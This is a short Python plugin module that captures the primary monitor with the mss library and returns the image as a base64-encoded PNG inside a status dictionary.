try:
    from .base import BasePlugin
except (ImportError, ValueError):
    from base import BasePlugin
from typing import Dict, Any

class ScreenshotPlugin(BasePlugin):
    @property
    def name(self): return "screenshot"

    def execute(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Captures a screenshot of the primary monitor."""
        try:
            import mss
            import mss.tools
            import base64
            
            with mss.mss() as sct:
                if not sct.monitors:
                    return {"status": "error", "error": "No monitors detected"}
                
                # Get raw pixels (index 1 is first monitor, 0 is all monitors combined)
                monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                sct_img = sct.grab(monitor)
                
                img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                
                encoded = base64.b64encode(img_bytes).decode('utf-8')
                
                return {
                    "status": "success",
                    "format": "png",
                    "content": encoded,
                    "size": len(img_bytes)
                }
        except Exception as e:
            return {"status": "error", "error": str(e)}
